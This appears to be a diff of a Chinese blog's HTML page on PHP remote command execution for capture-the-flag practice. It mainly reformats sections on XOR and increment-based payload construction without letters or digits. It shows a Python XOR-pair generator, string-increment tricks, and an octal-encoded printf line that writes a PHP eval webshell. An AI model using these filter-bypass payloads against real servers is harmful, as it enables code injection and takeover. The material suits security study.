@@ -63,7 +63,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article" style="position: absolute; top: 40px; z-index: 2;">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">RCE(命令执行)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%8C%87%E4%BB%A4"><span class="toc-text">Linux指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86"><span class="toc-text">文件管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Glob%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-text">Glob通配符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-text">系统命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E5%AD%97%E7%AC%A6"><span class="toc-text">绕过被过滤的字符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%95%E8%BF%87"><span class="toc-text">字符串绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base64"><span class="toc-text">base64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hex"><span class="toc-text">hex</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#oct-x2F-%E5%AD%97%E8%8A%82"><span class="toc-text">oct&#x2F;字节</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">单引号双引号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="toc-text">反斜杠绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8Drce"><span class="toc-text">无字母rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D"><span class="toc-text">取反</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-text">自增</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-text">临时文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BErce"><span class="toc-text">无回显rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82rce"><span class="toc-text">无参rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">突破禁用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E6%89%93%E5%8D%B0"><span class="toc-text">输出打印:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%EF%BC%9A"><span class="toc-text">查看目录：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-text">读取文件:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ob-%E4%BB%A3%E7%A0%81%E5%BA%94%E5%AF%B9"><span class="toc-text">ob_代码应对</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4"><span class="toc-text">系统环境变量构造命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E4%BB%A5%E9%9D%B6%E6%9C%BA%E4%B8%BA%E4%BE%8B"><span class="toc-text">环境变量(以靶机为例)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">利用数学函数构造命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getallheaders-%E5%87%BD%E6%95%B0"><span class="toc-text">getallheaders()函数</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">RCE(命令执行)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%8C%87%E4%BB%A4"><span class="toc-text">Linux指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86"><span class="toc-text">文件管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Glob%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-text">Glob通配符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-text">系统命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E5%AD%97%E7%AC%A6"><span class="toc-text">绕过被过滤的字符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%95%E8%BF%87"><span class="toc-text">字符串绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base64"><span class="toc-text">base64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hex"><span class="toc-text">hex</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#oct-x2F-%E5%AD%97%E8%8A%82"><span class="toc-text">oct&#x2F;字节</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">单引号双引号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="toc-text">反斜杠绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8Drce"><span class="toc-text">无字母rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D"><span class="toc-text">取反</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96"><span class="toc-text">异或</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-text">自增</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-text">临时文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BErce"><span class="toc-text">无回显rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82rce"><span class="toc-text">无参rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">突破禁用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E6%89%93%E5%8D%B0"><span class="toc-text">输出打印:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%EF%BC%9A"><span class="toc-text">查看目录：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-text">读取文件:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ob-%E4%BB%A3%E7%A0%81%E5%BA%94%E5%AF%B9"><span class="toc-text">ob_代码应对</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4"><span class="toc-text">系统环境变量构造命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E4%BB%A5%E9%9D%B6%E6%9C%BA%E4%B8%BA%E4%BE%8B"><span class="toc-text">环境变量(以靶机为例)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">利用数学函数构造命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getallheaders-%E5%87%BD%E6%95%B0"><span class="toc-text">getallheaders()函数</span></a></li></ol></li></ol></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -205,7 +205,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Web/" style="color: #ff7d73">Web</a>
+                <a href="/blog/tags/Web/" style="color: #03a9f4">Web</a>
             </span>
             
         </span>
@@ -565,56 +565,49 @@ $&#123;printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\1
 <span class="token keyword">echo</span> <span class="token string double-quoted-string">"?wllm=(~"</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$code1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")(~"</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$code2</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">");"</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<ul>
-<li>&#96;&#96;&#96;linux<br>$(())<br>$((~$(())))&#x3D;-1<br>${_} &#x3D;””返回上一次命令<pre class="line-numbers language-none"><code class="language-none">
-  
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$((</span><span class="token punctuation">))</span>
+$<span class="token punctuation">((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token operator">=</span>-1
+<span class="token variable">$&#123;_&#125;</span> <span class="token operator">=</span><span class="token string">""</span>返回上一次命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">valid <span class="token operator">=</span> <span class="token string">"1234567890!@$%^*()&#123;&#125;[];\'\",.&lt;>/?-=_`~ "</span>
+
+answer <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#请输入进行异或构造的字符串</span>
+
+tmp1<span class="token punctuation">,</span> tmp2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span>
+<span class="token keyword">for</span> c <span class="token keyword">in</span> answer<span class="token punctuation">:</span>
+  <span class="token keyword">for</span> i <span class="token keyword">in</span> valid<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> valid<span class="token punctuation">:</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        tmp1 <span class="token operator">+=</span> i
+        tmp2 <span class="token operator">+=</span> j
+        <span class="token keyword">break</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+      <span class="token keyword">continue</span>
+    <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"tmp1为:"</span><span class="token punctuation">,</span>tmp1<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"tmp2为:"</span><span class="token punctuation">,</span>tmp2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-### 异或
-
-&#96;&#96;&#96;python
-valid &#x3D; &quot;1234567890!@$%^*()&#123;&#125;[];\&#39;\&quot;,.&lt;&gt;&#x2F;?-&#x3D;_&#96;~ &quot;
-
-answer &#x3D; str(input(&quot;&quot;))#请输入进行异或构造的字符串
-
-tmp1, tmp2 &#x3D; &#39;&#39;, &#39;&#39;
-for c in answer:
-  for i in valid:
-    for j in valid:
-      if (ord(i) ^ ord(j) &#x3D;&#x3D; ord(c)):
-        tmp1 +&#x3D; i
-        tmp2 +&#x3D; j
-        break
-    else:
-      continue
-    break
-print(&quot;tmp1为:&quot;,tmp1)
-print(&quot;tmp2为:&quot;,tmp2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ul>
 <h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>(传入时记得url编码)</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">++</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>  <code>$_++</code>对<code>_</code>变量进行了自增操作,由于我们没有定义<code>_</code>的值,PHP会给<code>_</code>赋一个默认值NULL&#x3D;&#x3D;0,</p>
+<p>  由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字</p>
 <ul>
-<li>&#96;&#96;&#96;php<br>$_++&#x3D;1<pre class="line-numbers language-none"><code class="language-none">
-  &#96;$_++&#96;对&#96;_&#96;变量进行了自增操作,由于我们没有定义&#96;_&#96;的值,PHP会给&#96;_&#96;赋一个默认值NULL&#x3D;&#x3D;0,
+<li><p>注：linux命令下不能构造<code>($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)</code>类似语句获取数字</p>
+</li>
+<li><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为”Array”</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string double-quoted-string">"A"</span><span class="token operator">++</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token string double-quoted-string">"B"</span>
+<span class="token string double-quoted-string">"B"</span><span class="token operator">++</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token string double-quoted-string">"C"</span>
+    如果我们能够得到<span class="token string double-quoted-string">"A"</span>，那么我们就能通过自增自减，得到所有的字母
+    
+<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>   <span class="token comment">//得到"Array"</span>
+<span class="token variable">$___</span> <span class="token operator">=</span> <span class="token variable">$_</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">//得到"A"，$__没有定义，默认为False也即0，此时$___="A"</span>
 
-  由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字
-
-  - 注：linux命令下不能构造&#96;($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)&#96;类似语句获取数字
-
-  
-
-- 在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为&quot;Array&quot;
-
-  &#96;&#96;&#96;php
-  &quot;A&quot;++ &#x3D;&#x3D;&gt; &quot;B&quot;
-  &quot;B&quot;++ &#x3D;&#x3D;&gt; &quot;C&quot;
-      如果我们能够得到&quot;A&quot;，那么我们就能通过自增自减，得到所有的字母
-      
-  $_&#x3D;[].&#39;&#39;;   &#x2F;&#x2F;得到&quot;Array&quot;
-  $___ &#x3D; $_[$__];   &#x2F;&#x2F;得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___&#x3D;&quot;A&quot;
-  
-  $_&#x3D;_&#x2F;_._;   &#x2F;&#x2F; 得到&quot;NAN_&quot;
-  $_&#x3D;(_&#x2F;_._)[0]; &#x2F;&#x2F;得到&quot;N&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<span class="token variable">$_</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">/</span><span class="token constant">_</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">;</span>   <span class="token comment">// 得到"NAN_"</span>
+<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">_</span><span class="token operator">/</span><span class="token constant">_</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//得到"N"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ul>
 <h3 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h3><blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html"><code>$</code>和<code>_</code>均被过滤的情况</a>(P神文章)</p>
